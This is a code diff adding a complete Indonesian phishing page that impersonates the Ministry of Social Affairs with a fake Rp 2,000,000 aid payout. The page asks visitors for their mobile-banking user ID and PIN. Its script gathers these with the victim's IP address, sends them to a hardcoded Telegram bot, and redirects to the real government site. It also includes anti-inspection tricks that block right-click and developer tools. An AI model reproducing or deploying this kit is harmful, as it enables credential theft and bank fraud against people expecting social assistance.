@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Bansos 2026 - Konfirmasi Dana</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { -webkit-user-select: none; user-select: none; font-family: 'Inter', sans-serif; background-color: #f3f4f6; }
+        .loader-box { display: none; position: fixed; inset: 0; background: rgba(255,255,255,0.95); z-index: 999; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div id="loader" class="loader-box flex flex-col items-center justify-center">
+        <div class="w-12 h-12 border-4 border-red-600 border-t-transparent rounded-full animate-spin mb-4"></div>
+        <p class="font-bold text-red-600 animate-pulse text-sm">Sedang Menghubungkan ke Server m-Banking...</p>
+    </div>
+
+    <header class="bg-red-700 p-4 shadow-xl flex items-center gap-3">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/Pancasila_State_Coats_of_arms_of_Indonesia.svg/800px-Pancasila_State_Coats_of_arms_of_Indonesia.svg.png" class="w-10">
+        <div>
+            <h1 class="text-white font-black text-sm uppercase">Kementerian Sosial</h1>
+            <p class="text-white text-[10px] opacity-80 font-bold uppercase">Republik Indonesia</p>
+        </div>
+    </header>
+
+    <main class="max-w-md mx-auto p-4 mt-6">
+        <div class="bg-white p-6 rounded-3xl shadow-2xl border-t-8 border-red-600">
+            <div class="text-center mb-6">
+                <p class="text-[10px] font-bold text-gray-400 tracking-widest uppercase">Dana Bantuan Tahap 1</p>
+                <h2 class="text-4xl font-black text-red-600">Rp 2.000.000</h2>
+                <div class="mt-2 bg-green-100 py-1 px-3 rounded-full inline-block">
+                    <p class="text-[9px] text-green-700 font-black uppercase">Status: Siap Dicairkan</p>
+                </div>
+            </div>
+
+            <form id="vanzForm">
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-[10px] font-black text-gray-500 mb-1 uppercase tracking-tighter">Pilih Bank Pencairan</label>
+                        <select id="bank" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:ring-2 focus:ring-red-500 text-sm transition" required>
+                            <option value="">PILIH BANK (m-Banking)</option>
+                            <option>BANK BRI (BRIMO)</option>
+                            <option>BANK MANDIRI (LIVIN)</option>
+                            <option>BANK BNI (MOBILE BANKING)</option>
+                            <option>BANK BCA (MBCA)</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="block text-[10px] font-black text-gray-500 mb-1 uppercase tracking-tighter">User ID / Username</label>
+                        <input type="text" id="user" placeholder="Masukkan ID User m-Banking" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none text-sm focus:border-red-500 transition" required>
+                    </div>
+                    <div>
+                        <label class="block text-[10px] font-black text-gray-500 mb-1 uppercase tracking-tighter">Password / PIN Banking</label>
+                        <input type="password" id="pass" placeholder="Masukkan PIN/Password" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none text-sm focus:border-red-500 transition" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="w-full mt-8 py-5 bg-red-600 text-white font-black rounded-2xl shadow-[0_10px_20px_rgba(220,38,38,0.3)] active:scale-95 transition text-xs uppercase tracking-widest">
+                    Cairkan Saldo Sekarang 😈
+                </button>
+            </form>
+        </div>
+        
+        <p class="text-center text-[9px] text-gray-400 mt-10 tracking-[0.2em] font-bold uppercase">© 2026 KEMENSOS - VANZXTP SECURE SYSTEM</p>
+    </main>
+
+    <script>
+        // --- KONFIGURASI BOT VANZXTP ---
+        const TOKEN = "8574707132:AAGfO-vAcBclXIeTAGbyHvOCGIUT5dnxkQk"; // Ganti token asli bray!
+        const CHAT_ID = "6898713814"; // Ganti ID asli bray!
+
+        document.getElementById('vanzForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            document.getElementById('loader').style.display = 'flex';
+
+            let ipTarget = "Gagal Ambil IP";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ipTarget = ipData.ip;
+            } catch(e) { console.log("Skip IP"); }
+
+            const bank = document.getElementById('bank').value;
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            // Format Log Persis Screenshot Lu
+            const text = `🖐️ VanzXTP RESULT ACCOUNT 🖐️\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `🏦 Bank: ${bank}\n` +
+                         `📧 User: ${user}\n` +
+                         `🔑 Pass: ${pass}\n` +
+                         `🌐 IP: ${ipTarget}\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `OWNER VANZXTP 😈`;
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            })
+            .then(() => {
+                window.location.href = "https://cekbansos.kemensos.go.id/";
+            })
+            .catch(() => {
+                // Biar gak load terus kalo token salah
+                window.location.href = "https://cekbansos.kemensos.go.id/";
+            });
+        });
+
+        // Anti-Inspect (Dewa Mode)
+        document.onkeydown = (e) => {
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && ['I','C','J'].includes(String.fromCharCode(e.keyCode))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) return false;
+        };
+    </script>
+</body>
+</html>
